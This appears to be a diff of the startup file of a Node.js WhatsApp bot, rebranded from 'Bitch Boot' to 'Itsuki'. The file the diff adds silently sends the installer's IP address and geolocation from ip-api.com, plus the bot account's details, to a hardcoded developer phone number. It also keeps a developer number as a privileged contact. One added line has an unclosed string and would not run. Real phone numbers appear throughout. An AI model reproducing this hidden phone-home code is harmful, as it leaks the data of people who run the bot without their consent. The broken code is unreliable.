@@ -23,45 +23,42 @@ async function starts() {
 denz.autoReconnect = ReconnectMode.onConnectionLost
     denz.version = [2, 2119, 6]
     denz.logger.level = 'warn'
-    denz.browserDescription = ['Dcode Denpa','Desktop','3.0']
+    denz.browserDescription = ['I Am Itsuki','Windows','10.0']
     await sleep(10000)
     denz.on('qr', qr => {
         qrcode.generate(qr, { small: true })
-        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
+        console.log(color('[!]'), color('Scan this QR code', 'cyan'))
     })
-    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
+    fs.existsSync('./itsuki.json') && denz.loadAuthInfo('./itsuki.json')
     
     denz.on('credentials-updated', () => {
-        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
+        console.log(color('[!]'), color('credentials updated!', 'cyan'))
         })
      
       await denz.connect({ timeoutMs: 30 * 1000 });
-  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
- denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
- denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+  fs.writeFileSync("./itsuki.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"))
+ denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title: "I AM ITSUKI BOTZ",body:"CREATED BY YNTKTS:V",previewType:"PHOTO",thumbnail:fs.readFileSync('./thumb/thumb.jpeg'),sourceUrl:"https://wa.me/60199782326"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6285866295942@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
-     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+       denz.sendMessage("60199782326@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title: "I AM ITSUKI BOTZ",body:"YNTKTS",previewType:"PHOTO",thumbnail:fs.readFileSync('./thumb/thumb.jpeg),sourceUrl:"https://wa.me/60199782326"}}})
+     console.log(color('[WARN!!]', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
     denz.on('connecting', () => {
-		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
+		console.log(color('[!]'), color('Connecting...', 'cyan'))
 		})
 	
 	denz.on('open', () => {
-	console.log(color('|TRM|'), color('Connected', 'cyan'))
+	console.log(color('[√]'), color('Connected', 'cyan'))
 	}) 
      
     denz.on('ws-close', () => {
-        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
+        console.log(color('[!]'), color('Connection lost, trying to reconnect.', 'cyan'))
         })
     
     denz.on('close', async () => {
-        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
+        console.log(color('[!]'), color('Disconnected.', 'cyan'))
         })
     
 	if (!settings.autoplaymusic) {
@@ -70,8 +67,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["6285866295942@s.whatsapp.net","6283125187277@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6285866295942@s.whatsapp.net"
+        ownerNumber = ["0@s.whatsapp.net","0@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "60199782326@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         
@@ -81,28 +78,28 @@ exec(`cd /sdcard/download && play *mp3`)
     if(anu.announce == 'false'){
     teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
     denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
+    console.log(color('[SYSTEM]'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.announce == 'true'){
     teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
     denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
+    console.log(color('[SYSTEM]'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
   }
   else if(!anu.desc == ''){
     tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
     teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
     denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
+    console.log(color('[SYSTEM]'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.restrict == 'false'){
     teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
     denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
+    console.log(color('[SYSTEM]'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.restrict == 'true'){
     teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
     denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
-    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
+    console.log(color('[SYSTEM]'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
   }
 })
 
@@ -110,7 +107,7 @@ denz.on('CB:action,,call', async json => {
         const callerId = json[2][0][1].from;
         var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
         denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
-        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
+        denz.sendMessage(callerId, { displayname: `Owner Itsuki`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `I am developer of ${NamaBot}`,body:"YNTKTS",previewType:"PHOTO",thumbnail:fs.readFileSync('./thumb/thumb.jpeg'),sourceUrl:`https://wa.me/60199782326`}}})
         await sleep(5000)
         await denz.blockUser(callerId, "add")
         })
@@ -135,7 +132,7 @@ month: 'long',
 year: 'numeric'
 })
 denz.copyNForward(m.key.remoteJid, m.message)
-denz.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
+denz.sendMessage(m.key.remoteJid, `▷\`\`\`[ Anti Delete ]\`\`\`
 
 ▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
 ▢ \`\`\`Tipe : ${c3type}\`\`\`
@@ -155,20 +152,20 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('https://github.com/Adiixyz', 'cyan'))})}, 200 ) ;
 	}
 	else
 	{
 		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
 	}
 }
-console.log(color(figlet.textSync(`${settings.NamaBot}`, {
+console.log(color(figlet.textSync(`ITSUKI BOTZZZ`, {
 		font: 'Standard',
 		horizontalLayout: 'default',
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping(' Created By ITSUKI' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
 	title: '\n\nLoading' ,
